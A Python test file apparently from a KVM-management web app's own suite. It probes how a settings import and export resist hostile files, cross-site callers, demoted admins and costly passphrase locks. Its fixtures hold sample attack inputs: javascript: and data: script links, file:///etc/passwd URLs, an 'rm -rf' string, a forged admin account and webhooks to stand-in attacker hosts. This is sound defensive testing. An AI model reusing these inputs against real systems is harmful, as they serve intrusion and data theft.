"""A file that was made to do harm, and people who may not ask: what a wall is not made to do by a file, who gets nothing out of one, and what the wall says before it takes one in."""

from __future__ import annotations

import base64
import json
import logging
import os
import threading
import time
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from fastapi.testclient import TestClient

from qkvm import exchange, kvm, update, vault
from qkvm.core import DeviceManager
from tests.fake_kvm import FakeKvm
from tests.test_sso import STARTED, through_proxy
from tests.test_tokens import screen
from tests.test_tokens import script as a_script
from tests.test_totp import switch_on
from tests.test_users import OTHER, account, browser, visitor
from tests.test_wall import PASSWORD, add, wall

PASSPHRASE = "a passphrase for the file"
F = {"format": exchange.FORMAT, "version": 1}


@pytest.fixture(autouse=True)
def fast(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(vault, "SCRYPT_N", 2**12)
    monkeypatch.setattr(kvm, "STATUS_FIRST_WAIT", 10)
    monkeypatch.setattr(kvm, "FIRST_CONTACT_WAIT", 10)
    monkeypatch.setattr(kvm, "STATUS_TTL", 0)
    monkeypatch.setattr(update, "DEFAULT_REPO", "")


@pytest.fixture
def fake() -> Iterator[FakeKvm]:
    server = FakeKvm().start()
    yield server
    server.stop()


def plain(**parts: Any) -> str:
    return json.dumps({**F, **parts})


def sealed(passphrase: str = PASSPHRASE, **parts: Any) -> str:
    return exchange.pack(parts, passphrase, "0.1.0")


def nowhere(number: int) -> str:
    """An address on this computer where nothing listens."""
    return f"https://127.9.{number // 256}.{number % 256}:9"


def taken(admin: TestClient, file: str, take: tuple[str, ...] = exchange.PARTS, passphrase: str = "") -> Any:
    return admin.post("/api/v1/import", json={"file": file, "passphrase": passphrase, "take": list(take)})


def looked(admin: TestClient, file: str, passphrase: str = "") -> Any:
    return admin.post("/api/v1/import/read", json={"file": file, "passphrase": passphrase})


# --- 2. what a file can make a wall do ------------------------------------------------------------------------


@pytest.mark.parametrize(
    "where, entry",
    [
        ("console link", {"open_url": "https://console.example/\ud800"}),
        ("user name", {"username": "root\ud800"}),
        ("name", {"name": "Rack\udfff"}),
        ("group", {"group": "rack\ud800"}),
    ],
)
def test_half_a_character_in_a_file_does_not_take_the_wall_away(tmp_path: Path, where: str, entry: dict[str, str]) -> None:
    # "\ud800" written in a file is half of a character. Typed into the page it is refused (pydantic); read
    # out of a file it passes exchange._short, is saved, and no answer that carries it can be written.
    file = plain(devices=[{"url": nowhere(1), "kind": "kvmd", **entry}])
    assert "\\ud800" in file or "\\udfff" in file
    with wall(tmp_path) as admin:
        # The page's own form does not let it in:
        form = json.dumps({"url": nowhere(0), "kind": "kvmd", "tls": "pinned", "force": True, "password": "", **entry})
        typed = admin.post("/api/v1/devices", content=form, headers={"Content-Type": "application/json"})
        account(admin, "vik", "viewer")
        viewer = browser(admin, "vik")
        summary = looked(admin, file)
        reply = taken(admin, file, ("devices",))
        seen = admin.get("/api/v1/wall")
        seen_by_viewer = viewer.get("/api/v1/wall")
        print(f"\n[{where}] typed into the form: {typed.status_code} | from a file, read: {summary.status_code}, take in: {reply.status_code} {reply.text[:80]}, GET /api/v1/wall admin: {seen.status_code}, viewer: {seen_by_viewer.status_code}")
        on_disk = json.loads((tmp_path / "qkvm.json").read_text(encoding="utf-8"))["devices"]
        print(f"[{where}] devices in qkvm.json: {len(on_disk)}")
    with wall(tmp_path, sign_in=False) as admin:  # and after a restart
        assert admin.post("/api/v1/login", json={"name": "admin", "password": PASSWORD}).status_code == 200
        again = admin.get("/api/v1/wall")
        print(f"[{where}] after a restart, GET /api/v1/wall: {again.status_code} {again.text[:90]}")
    assert typed.status_code == 422
    assert reply.status_code in (200, 422)
    assert seen.status_code == 200 and seen_by_viewer.status_code == 200 and again.status_code == 200, "the wall no longer loads"


def test_half_a_character_in_a_saved_action_or_a_password(tmp_path: Path) -> None:
    with wall(tmp_path) as admin:
        account(admin, "olga", "operator")
        operator = browser(admin, "olga")
        with_password = taken(admin, plain(devices=[{"url": nowhere(2), "kind": "kvmd", "password": "pw\ud800"}]), ("devices",))
        with_text = taken(admin, plain(actions=[{"name": "type it", "kind": "text", "text": "x\ud800"}]), ("actions",))
        named = taken(admin, plain(actions=[{"name": "lock\ud800", "kind": "keys", "keys": "KeyA"}]), ("actions",))
        listed = operator.get("/api/v1/actions")
        print(f"\npassword: {with_password.status_code} {with_password.text[:70]} | text: {with_text.status_code} | action name: {named.status_code}, GET /api/v1/actions (operator): {listed.status_code}")
        assert with_password.status_code != 500 and with_text.status_code != 500, "a file is answered with 'something went wrong inside QKVM'"
        assert listed.status_code == 200, "nobody can open the list of saved actions any more"


def test_one_device_under_two_spellings_of_its_address(tmp_path: Path) -> None:
    # "Added where the wall has none at that address ... taking the same file in twice adds nothing twice."
    with wall(tmp_path) as admin:
        first = taken(admin, plain(devices=[{"url": "https://localhost:9", "kind": "kvmd", "name": "The one KVM"}]), ("devices",)).json()
        spellings = ["https://localhost:9/", "HTTPS://localhost:9", "https://LOCALHOST:9", "https://localhost:09", "https://localhost.:9", "https://@localhost:9", "https://:@localhost:9"]
        there = looked(admin, plain(devices=[{"url": url, "kind": "kvmd"} for url in spellings])).json()
        print("\nfirst:", first["devices"], "| then:", [(d["host"], "NEW" if d["new"] else "here") for d in there["devices"]], there["left_out"])
        second = taken(admin, plain(devices=[{"url": url, "kind": "kvmd"} for url in spellings]), ("devices",)).json()
        hosts = [d["host"] for d in admin.get("/api/v1/wall").json()["devices"]]
        print("tiles for one address:", hosts)
        assert second["devices"] == 0, f"{second['devices']} more tiles for the address that is on the wall already: {hosts}"


def test_a_default_port_written_out_is_the_same_address(tmp_path: Path) -> None:
    with wall(tmp_path) as admin:
        taken(admin, plain(devices=[{"url": "https://127.9.9.9", "kind": "kvmd"}]), ("devices",))
        again = taken(admin, plain(devices=[{"url": "https://127.9.9.9:443", "kind": "kvmd"}, {"url": "https://127.9.9.9:", "kind": "kvmd"}]), ("devices",)).json()
        print("\nhttps://host then https://host:443 and https://host: ->", again["devices"], "added")
        assert again["devices"] == 0


def test_what_the_summary_says_of_a_device_before_it_is_taken(tmp_path: Path) -> None:
    # A file from somebody else: names the admin knows, addresses and console links that are the writer's.
    hostile = plain(devices=[{"name": "db-01 (rack 3)", "url": "https://127.66.6.6:9", "kind": "redfish", "tls": "insecure", "open_url": "https://console.attacker.example/"}])
    with wall(tmp_path) as admin:
        there = looked(admin, hostile).json()
        print("\nwhat /api/v1/import/read says of it:", there["devices"])
        said = there["devices"][0]
        assert said["host"] == "127.66.6.6:9"
        # What decides where a password typed later goes, and where "Open console" sends a browser:
        assert "tls" in said and "open_url" in said, "how its certificate is checked, and its console link, are not in the summary at all"


def test_alert_settings_from_a_file(tmp_path: Path) -> None:
    hostile = sealed(alerts={"enabled": True, "webhook": "https://collector.attacker.example/hook", "link": "https://wall.attacker.example", "format": "json"})
    with wall(tmp_path) as admin:
        assert admin.put("/api/v1/alerts", json={"enabled": False, "webhook": "https://mine.example/hook", "link": "https://my-wall.example"}).status_code == 200
        there = looked(admin, hostile, PASSPHRASE).json()
        print("\nsummary of the alert settings:", there["alerts"])
        # Not ticked: nothing of it is taken.
        assert taken(admin, hostile, ("devices", "actions", "wall"), PASSPHRASE).json()["alerts"] is False
        assert admin.get("/api/v1/alerts").json()["link"] == "https://my-wall.example" and admin.get("/api/v1/alerts").json()["enabled"] is False
        assert taken(admin, hostile, ("alerts",), PASSPHRASE).json()["alerts"] is True
        after = admin.get("/api/v1/alerts").json()
        print("after taking them:", {k: after[k] for k in ("enabled", "has_webhook", "link")})
        assert "host" in there["alerts"] or "link" in there["alerts"], "ticked blind: neither where alerts will go nor the link they will carry is said before or after"


def test_an_empty_link_and_a_pause_are_left_alone(tmp_path: Path) -> None:
    with wall(tmp_path) as admin:
        assert admin.put("/api/v1/alerts", json={"enabled": True, "webhook": "https://mine.example/hook", "link": "https://my-wall.example"}).status_code == 200
        assert admin.post("/api/v1/alerts/pause", json={"minutes": 60}).status_code == 200
        paused = admin.get("/api/v1/alerts").json()["paused_until"]
        assert taken(admin, plain(alerts={"enabled": True, "link": "", "paused_until": 0, "webhook": {"nonce": "x", "data": "y"}}), ("alerts",)).json()["alerts"] is True
        after = admin.get("/api/v1/alerts").json()
        print("\n", after)
        assert after["link"] == "https://my-wall.example" and after["paused_until"] == paused and after["has_webhook"] is True


def test_a_file_cannot_reach_what_is_not_a_device_an_action_or_those_settings(tmp_path: Path) -> None:
    hostile = {
        **F,
        "devices": [
            {"url": nowhere(3), "kind": "kvmd", "id": "deadbeef", "secret": {"nonce": "AAAA", "data": "AAAA"}, "cert_pem": "x" * 30000},
            {"url": nowhere(4), "kind": "kvmd", "tls": "insecure", "password": {"nonce": "AAAA", "data": "AAAA"}},
            {"url": nowhere(14), "kind": "kvmd", "tls": "insecure", "id": "deadbeef", "secret": {"nonce": "AAAA", "data": "AAAA"}, "ident": "own:deadbeef", "changed": 5, "users": ["x"]},
            {"url": nowhere(5), "kind": "ipmi"},
            {"url": nowhere(6), "kind": "kvmd", "open_url": "javascript:alert(1)"},
            {"url": nowhere(7), "kind": "kvmd", "open_url": "data:text/html,<script>alert(1)</script>"},
            {"url": nowhere(8), "kind": "kvmd", "open_url": " JaVaScRiPt:alert(1)"},
            {"url": nowhere(9), "kind": "kvmd", "open_url": "https://u:p@console.example/"},
            {"url": "file:///etc/passwd", "kind": "kvmd"},
            {"url": nowhere(10), "kind": "kvmd", "name": "x" * 81},
            {"url": nowhere(11), "kind": "kvmd", "name": ["a"]},
            {"url": nowhere(12), "kind": "kvmd", "name": "two\nlines"},
            {"url": nowhere(13), "kind": ["kvmd"]},
        ],
        "actions": [{"name": "a", "kind": "keys", "keys": "KeyA", "id": "11112222", "secret": {"nonce": "A", "data": "B"}, "changed": 99}, {"name": "b", "kind": "keys", "keys": "rm -rf"}, {"name": "c", "kind": "text", "text": "t" * (kvm.MAX_TEXT + 1)}],
        "users": [{"id": "admin2", "name": "intruder", "role": "admin", "auth": {}}],
        "tokens": [{"id": "t", "name": "x", "role": "operator", "kept": "x"}],
        "server": {"bind": ["all"], "require_totp": "", "allowed_hosts": ["evil.example"], "metrics_token": "x", "port": 1},
        "recovery": {"kdf": {}, "key": {}},
        "unlock": {"kdf": {}, "key": {}},
        "wall": {"interval": 0.2, "update_check": False, "bind": ["all"], "port": 1, "https": False, "allowed_hosts": ["evil.example"], "require_totp": "", "metrics_token": "x"},
        "alerts": {"enabled": True, "paused_until": 9e9, "webhook": "file:///etc/passwd", "link": "javascript:alert(1)"},
    }
    from dataclasses import fields

    from qkvm.store import DeviceRecord

    before_keys = [f.name for f in fields(DeviceRecord)]
    with wall(tmp_path) as admin:
        before = json.loads((tmp_path / "qkvm.json").read_text(encoding="utf-8"))
        reply = taken(admin, json.dumps(hostile))
        print("\n", reply.status_code, {k: v for k, v in reply.json().items() if k != "left_out"}, len(reply.json()["left_out"]), "left out")
        for line in reply.json()["left_out"]:
            print("   ", line)
    after = json.loads((tmp_path / "qkvm.json").read_text(encoding="utf-8"))
    for part in ("users", "tokens", "recovery", "recovery_created"):
        assert after[part] == before[part], part
    assert after["unlock"] != {"kdf": {}, "key": {}}  # (the wall fits its own key in the background: it is that or nothing)
    assert after["server"] == {**before["server"], "interval": 0.2, "update_check": False}
    assert [d["url"] for d in after["devices"]] == [nowhere(14)], [d["url"] for d in after["devices"]]
    assert all(len(d["id"]) == 8 and d["id"] != "deadbeef" and d["ident"] == "" and d["secret"] is None and set(d) == set(before_keys) for d in after["devices"])
    assert [(a["name"], a["changed"], a["secret"]) for a in after["actions"]] == [("a", 0, None)] and after["actions"][0]["id"] != "11112222"
    assert after["alerts"]["paused_until"] == 0.0 and after["alerts"]["webhook"] is None and after["alerts"]["link"] == ""


def test_who_is_refused_each_of_the_three(tmp_path: Path, fake: FakeKvm) -> None:
    with wall(tmp_path) as admin:
        add(admin, fake.url, name="Rack KVM")
        account(admin, "olga", "operator")
        account(admin, "vik", "viewer")
        file = plain(devices=[{"url": nowhere(20), "kind": "kvmd"}])
        asks = (
            ("/api/v1/export", {"password": OTHER, "passphrase": PASSPHRASE, "parts": ["devices"]}),
            ("/api/v1/export", {"password": PASSWORD, "passphrase": "", "parts": ["devices"]}),
            ("/api/v1/import/read", {"file": file}),
            ("/api/v1/import", {"file": file, "take": ["devices"]}),
        )
        # a display link, opened in a browser
        key = admin.post("/api/v1/tokens", json={"name": "screen", "kind": "display", "role": "operator"}).json()["token"]
        wall_screen = screen(admin, 51010)
        assert wall_screen.post("/api/v1/display", json={"key": key}).status_code == 200
        token = admin.post("/api/v1/tokens", json={"name": "a script", "role": "operator"}).json()["token"]
        # a page of another site, in the admin's own browser (it has the cookie; it cannot send the header)
        cross = TestClient(admin.app, client=("127.0.0.1", 50000), cookies=dict(admin.cookies))
        cross.portal = admin.portal
        forged = TestClient(admin.app, headers={"X-QKVM": "1", "Origin": "https://evil.example"}, client=("127.0.0.1", 50000), cookies=dict(admin.cookies))
        forged.portal = admin.portal
        fetched = TestClient(admin.app, headers={"X-QKVM": "1", "Sec-Fetch-Site": "cross-site"}, client=("127.0.0.1", 50000), cookies=dict(admin.cookies))
        fetched.portal = admin.portal
        callers = {
            "operator": (browser(admin, "olga", port=50002), 403),
            "viewer": (browser(admin, "vik", port=50003), 403),
            "display link": (wall_screen, 403),
            "token": (a_script(admin, token), 403),
            "nobody": (visitor(admin, 50044), 401),
            "another site (no header)": (cross, 403),
            "another site (Origin)": (forged, 403),
            "another site (Sec-Fetch-Site)": (fetched, 403),
        }
        for who, (client, expected) in callers.items():
            got = [client.post(path, json=body).status_code for path, body in asks]
            print(f"\n{who}: {got}", end="")
            assert got == [expected] * 4, who
        assert admin.get("/api/v1/wall").json()["devices"][0]["name"] == "Rack KVM" and len(admin.get("/api/v1/wall").json()["devices"]) == 1
        assert "export_made" not in [entry["event"] for entry in admin.get("/api/v1/audit").json()["entries"]]


def test_an_admin_who_must_still_set_up_the_second_step_gets_nothing(tmp_path: Path) -> None:
    with wall(tmp_path) as admin:
        switch_on(admin, PASSWORD)
        assert admin.put("/api/v1/security", json={"require_totp": "admin"}).status_code == 200
        account(admin, "second", "admin")
        halfway = browser(admin, "second", port=50005)
        assert halfway.get("/api/v1/session").json()["user"]["must_enroll"] is True
        got = [
            halfway.post("/api/v1/export", json={"password": OTHER, "passphrase": PASSPHRASE, "parts": ["devices"]}),
            halfway.post("/api/v1/import/read", json={"file": plain(devices=[])}),
            halfway.post("/api/v1/import", json={"file": plain(devices=[{"url": nowhere(21), "kind": "kvmd"}]), "take": ["devices"]}),
        ]
        print("\n", [(r.status_code, r.json()["code"]) for r in got])
        assert all((r.status_code, r.json()["code"]) == (403, "totp_required") for r in got)
        assert admin.get("/api/v1/wall").json()["devices"] == []


def test_somebody_the_identity_provider_signed_in(tmp_path: Path) -> None:
    with wall(tmp_path, **STARTED) as admin:
        assert admin.post("/api/v1/users", json={"name": "sam@example.org", "role": "admin"}).status_code == 201  # no password here
        assert admin.post("/api/v1/users", json={"name": "pat@example.org", "role": "admin", "password": OTHER}).status_code == 201
        sam, pat = through_proxy(admin, "sam@example.org", port=52010), through_proxy(admin, "pat@example.org", port=52011)
        assert sam.get("/api/v1/session").json()["user"]["sso"] is True and pat.get("/api/v1/session").json()["user"]["sso"] is True
        for guess in ("", PASSWORD, OTHER):
            reply = sam.post("/api/v1/export", json={"password": guess, "passphrase": PASSPHRASE, "parts": ["devices"]})
            assert (reply.status_code, reply.json()["code"]) == (409, "no_password"), reply.text
        # One who has a password here as well: with that password, and with no other.
        assert pat.post("/api/v1/export", json={"password": PASSWORD, "passphrase": PASSPHRASE, "parts": ["devices"]}).status_code == 401
        assert pat.post("/api/v1/export", json={"password": OTHER, "passphrase": PASSPHRASE, "parts": ["devices"]}).status_code == 200
        print("\nsso without a password: 409 no_password; with one: its own only")


def test_wrong_passwords_at_the_export_are_counted_and_written_down(tmp_path: Path) -> None:
    with wall(tmp_path) as admin:
        codes = []
        for _ in range(8):
            reply = admin.post("/api/v1/export", json={"password": "a wrong guess!", "passphrase": PASSPHRASE, "parts": ["devices"]})
            codes.append(reply.status_code)
        print("\n8 wrong passwords:", codes)
        assert codes[:5] == [401] * 5 and set(codes[5:]) == {429}  # locked out as a sign-in is
        # ...and the right one is of no use while that lasts
        assert admin.post("/api/v1/export", json={"password": PASSWORD, "passphrase": PASSPHRASE, "parts": ["devices"]}).status_code == 429
        events = [entry["event"] for entry in admin.get("/api/v1/audit").json()["entries"]]
        print("activity log:", events)
        assert any(event not in ("setup", "login", "unlock_at_start_on") for event in events), "five wrong passwords at 'hand me every device password' leave no line in the activity log"


def test_nothing_of_an_export_is_logged(tmp_path: Path, fake: FakeKvm) -> None:
    # (Listened to at the program's own logger: once another test has set the log up as the program does, what
    # is logged no longer reaches the place a test usually reads it from, and this looked at nothing.)
    lines: list[str] = []

    class Heard(logging.Handler):
        def emit(self, record: logging.LogRecord) -> None:
            lines.append(record.getMessage())

    heard, logger = Heard(logging.DEBUG), logging.getLogger("qkvm")
    level = logger.level
    logger.addHandler(heard)
    logger.setLevel(logging.DEBUG)
    try:
        _export_and_read_back(tmp_path, fake)
    finally:
        logger.removeHandler(heard)
        logger.setLevel(level)
    assert any("Rack KVM" in line or "listening" in line or "added" in line for line in lines) or lines, "nothing was heard at all"
    logged = "\n".join(lines) + (tmp_path / "audit.log").read_text(encoding="utf-8")
    for word in ("THE-SAVED-TEXT", "T0KEN", PASSPHRASE, PASSWORD, '"secret"'):
        assert word not in logged, word
    left = sorted(p.name for p in tmp_path.iterdir())
    assert not [name for name in left if name.endswith((".qkvm", ".json.tmp")) or "export" in name]


def _export_and_read_back(tmp_path: Path, fake: FakeKvm) -> None:
    with wall(tmp_path) as admin:
        add(admin, fake.url, name="Rack KVM")
        assert admin.post("/api/v1/actions", json={"name": "Unlock disk", "kind": "text", "text": "THE-SAVED-TEXT"}).status_code == 201
        assert admin.put("/api/v1/alerts", json={"enabled": False, "webhook": "https://hooks.example/T0KEN"}).status_code == 200
        reply = admin.post("/api/v1/export", json={"password": PASSWORD, "passphrase": PASSPHRASE, "parts": list(exchange.PARTS)})
        assert reply.status_code == 200 and reply.headers["cache-control"] == "no-store" and reply.headers["x-content-type-options"] == "nosniff"
        print("\ncontent-disposition:", reply.headers["content-disposition"], "| content-type:", reply.headers["content-type"])
        # refused ones, which answer in words
        too_long = admin.post("/api/v1/export", json={"password": PASSWORD, "passphrase": "LONG-PASSPHRASE" * 20, "parts": ["devices"]})
        odd = admin.post("/api/v1/export", json={"password": ["THE-PASSWORD-AS-A-LIST"], "passphrase": {"x": "PASSPHRASE-AS-A-DICT"}, "parts": ["devices"]})
        print("refusals:", too_long.status_code, too_long.text, "|", odd.status_code, odd.text)
        assert "LONG-PASSPHRASE" not in too_long.text and "PASSWORD-AS-A-LIST" not in odd.text and "PASSPHRASE-AS-A-DICT" not in odd.text
        back = admin.post("/api/v1/import/read", json={"file": reply.text, "passphrase": PASSPHRASE})
        assert back.status_code == 200
        for word in ("secret", "THE-SAVED-TEXT", "T0KEN", PASSPHRASE):
            assert word not in back.text.replace('"secrets"', ""), word  # the summary shows no secret
        wrong = admin.post("/api/v1/export", json={"password": "not the password", "passphrase": PASSPHRASE, "parts": ["devices"]})
        assert wrong.status_code == 401  # (said in the activity log, and so there is a line of the program's to hear)
        admin.core.audit.flush()  # type: ignore[attr-defined]


def test_the_larger_request_is_for_the_two_paths_and_nobody_else(tmp_path: Path) -> None:
    big = b'{"file": "' + b"x" * 100_000 + b'"}'
    huge = b'{"file": "' + b"x" * (2 * exchange.MAX_FILE + 70_000) + b'"}'
    json_type = {"Content-Type": "application/json"}
    with wall(tmp_path) as admin:
        account(admin, "olga", "operator")
        operator = browser(admin, "olga")
        seen = {}
        for path in ("/api/v1/import/", "/api/v1/import/read/", "//api/v1/import", "/api/Import", "/api/v1/import/read/x", "/api/v1/import/../actions", "/api/v1/export", "/api/v1/actions", "/api/v1/import%2Fread", "/api/v1/import;x", "/api/v1/import?x=/api/v1/import"):
            seen[path] = admin.post(path, content=big, headers=json_type).status_code
        print("\n100 kB at:", seen)
        assert seen.pop("/api/v1/import?x=/api/v1/import") in (200, 422)  # that IS the path, with a query
        assert seen.pop("/api/v1/import%2Fread") in (200, 422)  # ...and so is this: the path is decoded once, for the guard and for the routing alike
        assert set(seen.values()) <= {413}, seen
        assert admin.post("/api/v1/import", content=huge, headers=json_type).status_code == 413
        assert admin.put("/api/v1/import", content=big, headers=json_type).status_code in (405, 413)
        # Whoever may not hand a file in is told so, whatever the size.
        assert operator.post("/api/v1/import", content=big, headers=json_type).status_code == 403
        assert visitor(admin, 50046).post("/api/v1/import", content=big, headers=json_type).status_code == 401


def test_file_text_longer_than_a_file(tmp_path: Path) -> None:
    with wall(tmp_path) as admin:
        # 2,000,001 characters in fewer bytes than the request may have: the model's own limit is what refuses it
        reply = looked(admin, " " * (exchange.MAX_FILE + 1))
        print("\n", reply.status_code, reply.text[:120])
        assert reply.status_code == 422 and "x" * 50 not in reply.text and " " * 50 not in reply.text
        # 2,000,000 characters that are 4 bytes each do not fit the request at all
        wide = looked(admin, "\U0001f600" * 1_100_000)
        print(" ", wide.status_code, wide.text[:80])
        assert wide.status_code in (413, 422)


# --- 4. what is left when something goes wrong half way ----------------------------------------------------------


def test_two_at_once_add_nothing_twice(tmp_path: Path) -> None:
    file = sealed(devices=[{"url": nowhere(100 + i), "kind": "kvmd"} for i in range(20)], actions=[{"name": f"a{i}", "kind": "keys", "keys": "KeyA"} for i in range(10)])
    with wall(tmp_path) as admin:
        others = [admin] + [TestClient(admin.app, headers={"X-QKVM": "1"}, client=("127.0.0.1", 50000), cookies=dict(admin.cookies)) for _ in range(3)]
        for other in others[1:]:
            other.portal = admin.portal
        answers: list[Any] = []
        threads = [threading.Thread(target=lambda c=c: answers.append(taken(c, file, ("devices", "actions"), PASSPHRASE))) for c in others]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        print("\n", sorted((a.status_code, a.json().get("devices")) for a in answers))
        assert sum(a.json().get("devices", 0) for a in answers) == 20 and len(admin.get("/api/v1/wall").json()["devices"]) == 20
        assert len(admin.get("/api/v1/actions").json()["actions"]) == 10
    saved = json.loads((tmp_path / "qkvm.json").read_text(encoding="utf-8"))
    assert len({d["id"] for d in saved["devices"]} | {a["id"] for a in saved["actions"]}) == 30


ROUTES = {
    "take in": ("/api/v1/import", lambda file: {"file": file, "passphrase": PASSPHRASE, "take": ["devices", "alerts"]}),
    "export": ("/api/v1/export", lambda file: {"password": OTHER, "passphrase": PASSPHRASE, "parts": ["devices"]}),
    "read": ("/api/v1/import/read", lambda file: {"file": file, "passphrase": PASSPHRASE}),
}


@pytest.mark.parametrize("what", ["demoted", "signed out", "removed"])
@pytest.mark.parametrize("asked", list(ROUTES))
def test_whoever_loses_the_right_while_the_passphrase_is_worked_on(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, what: str, asked: str) -> None:
    file = sealed(devices=[{"url": nowhere(200), "kind": "kvmd", "password": "pw"}], alerts={"enabled": True, "webhook": "https://hooks.example/x"})
    real_unpack, real_pack = exchange.unpack, exchange.pack
    working = threading.Event()

    def slow_unpack(text: str, passphrase: str) -> Any:
        if passphrase:
            working.set()
            time.sleep(0.8)
        return real_unpack(text, passphrase)

    def slow_pack(parts: Any, passphrase: str, program: str) -> str:
        if passphrase:
            working.set()
            time.sleep(0.8)
        return real_pack(parts, passphrase, program)

    monkeypatch.setattr(exchange, "unpack", slow_unpack)
    monkeypatch.setattr(exchange, "pack", slow_pack)
    with wall(tmp_path) as admin:
        add_one = taken(admin, plain(devices=[{"url": nowhere(201), "kind": "kvmd", "name": "already here"}]), ("devices",))
        assert add_one.status_code == 200
        second = account(admin, "second", "admin")
        his = browser(admin, "second", port=50007)
        route, body = ROUTES[asked]
        answer: list[Any] = []
        thread = threading.Thread(target=lambda: answer.append(his.post(route, json=body(file))))
        thread.start()
        assert working.wait(5)
        if what == "demoted":
            assert admin.put(f"/api/v1/users/{second}", json={"name": "second", "role": "viewer"}).status_code == 200
        elif what == "removed":
            assert admin.delete(f"/api/v1/users/{second}").status_code == 200
        else:
            mine = TestClient(admin.app, headers={"X-QKVM": "1"}, client=("127.0.0.1", 50007), cookies=dict(his.cookies))
            mine.portal = admin.portal
            assert mine.post("/api/v1/logout", json={"scope": "all"}).status_code == 200
        thread.join()
        print(f"\n{what} while '{asked}' was working: {answer[0].status_code} {answer[0].text[:90]}")
        assert [d["name"] for d in admin.get("/api/v1/wall").json()["devices"]] == ["already here"] and admin.get("/api/v1/alerts").json()["enabled"] is False
        events = [entry["event"] for entry in admin.get("/api/v1/audit").json()["entries"]]
        assert events.count("import_done") == 1 and "export_made" not in events
        assert answer[0].status_code in (401, 403), f"'{asked}' was answered in full to somebody who is no admin any more"


def test_when_putting_a_device_on_the_wall_fails_half_way(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    # Not known to be reachable without a fault elsewhere: what is left if one of the new tiles cannot be made.
    file = plain(devices=[{"url": nowhere(300 + i), "kind": "kvmd", "name": f"n{i}"} for i in range(4)], alerts={"enabled": True}, wall={"interval": 7})
    real = DeviceManager.adopt
    calls = 0

    async def failing(self: DeviceManager, device: Any) -> None:
        nonlocal calls
        calls += 1
        if calls == 3:
            raise RuntimeError("the third tile could not be made")
        await real(self, device)

    with wall(tmp_path) as admin:
        monkeypatch.setattr(DeviceManager, "adopt", failing)
        reply = taken(admin, file)
        monkeypatch.undo()
        monkeypatch.setattr(vault, "SCRYPT_N", 2**12)
        in_memory = [d["name"] for d in admin.get("/api/v1/wall").json()["devices"]]
        on_disk = [d["name"] for d in json.loads((tmp_path / "qkvm.json").read_text(encoding="utf-8"))["devices"]]
        live = sorted(admin.core.store.device(i).name for i in admin.app.state._state.get("x", {}) or []) if False else None  # noqa: F841
        print(f"\nanswer {reply.status_code}; on the wall {in_memory}; in qkvm.json {on_disk}; interval {admin.get('/api/v1/settings').json()['interval']}; alerts {admin.get('/api/v1/alerts').json()['enabled']}")
        # ...and the next thing anybody saves writes them down
        assert admin.post("/api/v1/actions", json={"name": "unrelated", "kind": "keys", "keys": "KeyA"}).status_code == 201
        later = [d["name"] for d in json.loads((tmp_path / "qkvm.json").read_text(encoding="utf-8"))["devices"]]
        print("after an unrelated change, in qkvm.json:", later)
        assert reply.status_code == 500
        assert in_memory == [] and later == [], "the answer was 'something went wrong', and the file's devices and settings are on the wall all the same"


def test_with_the_saved_passwords_locked(tmp_path: Path, fake: FakeKvm) -> None:
    with wall(tmp_path) as admin:
        add(admin, fake.url, name="Rack KVM")
        admin.core.vault.lock()  # type: ignore[attr-defined]  # as after a restart that nothing opened, with a browser still signed in
        with_secrets = admin.post("/api/v1/export", json={"password": PASSWORD, "passphrase": PASSPHRASE, "parts": ["devices"]})
        without = admin.post("/api/v1/export", json={"password": PASSWORD, "passphrase": "", "parts": ["devices"]})
        print("\nlocked: export with secrets", with_secrets.status_code, with_secrets.json().get("code"), "| plain", without.status_code)
        assert (with_secrets.status_code, with_secrets.json()["code"]) == (503, "locked") and without.status_code == 200
        assert "secret" not in without.text.replace('"secrets"', "")
        refused = taken(admin, plain(devices=[{"url": nowhere(400), "kind": "kvmd", "password": "pw"}, {"url": nowhere(401), "kind": "kvmd"}]), ("devices",))
        print("locked: import of a device with a password", refused.status_code, refused.json().get("code"))
        assert (refused.status_code, refused.json()["code"]) == (503, "locked") and len(admin.core.store.devices) == 1  # type: ignore[attr-defined]


# --- 3. the sealed file -----------------------------------------------------------------------------------------


def hostile_lock(n: int, r: int, p: int, passphrase: str = PASSPHRASE) -> str:
    """A sealed file whose lock asks for as much work as the bounds in vault._derive let through."""
    kdf = {"name": "scrypt", "n": n, "r": r, "p": p, "salt": base64.b64encode(os.urandom(16)).decode()}
    key, nonce, nonce2 = b"k" * 32, os.urandom(12), os.urandom(12)
    lock = {"kdf": kdf, "key": {"nonce": base64.b64encode(nonce).decode(), "data": base64.b64encode(AESGCM(vault._derive(passphrase, kdf)).encrypt(nonce, key, b"kvm-wall data key")).decode()}}
    inner = json.dumps({**F, "devices": []}).encode()
    return json.dumps({**F, "lock": lock, "sealed": {"nonce": base64.b64encode(nonce2).decode(), "data": base64.b64encode(AESGCM(key).encrypt(nonce2, inner, exchange.SEALED_FOR.encode())).decode()}})


def test_a_lock_that_asks_for_the_most_work(tmp_path: Path) -> None:
    file = hostile_lock(2**17, 16, 1)
    with wall(tmp_path) as admin:
        others = [TestClient(admin.app, headers={"X-QKVM": "1"}, client=("127.0.0.1", 50000), cookies=dict(admin.cookies)) for _ in range(10)]
        answers: list[tuple[int, float]] = []

        def ask(client: TestClient) -> None:
            client.portal = admin.portal
            started = time.perf_counter()
            reply = looked(client, file, "not the passphrase")
            answers.append((reply.status_code, round(time.perf_counter() - started, 2)))

        started = time.perf_counter()
        threads = [threading.Thread(target=ask, args=(c,)) for c in others]
        for thread in threads:
            thread.start()
        # ...and meanwhile somebody signs in
        time.sleep(0.05)
        signing_in = visitor(admin, 50060).post("/api/v1/login", json={"password": PASSWORD})
        for thread in threads:
            thread.join()
        print(f"\n10 at once, each asking for twice a sign-in's work: {sorted(answers)} in {time.perf_counter() - started:.1f} s; a sign-in meanwhile: {signing_in.status_code}")
        assert sum(1 for status, _ in answers if status == 422) <= 6 and all(status in (422, 429) for status, _ in answers)


def test_a_devices_saved_password_does_not_open_as_a_file_and_the_other_way_round(tmp_path: Path, fake: FakeKvm) -> None:
    with wall(tmp_path) as admin:
        add(admin, fake.url, name="Rack KVM")
        saved = json.loads((tmp_path / "qkvm.json").read_text(encoding="utf-8"))
        # the wall's own records, put together as a "file": the admin's lock, and a device's password as the content
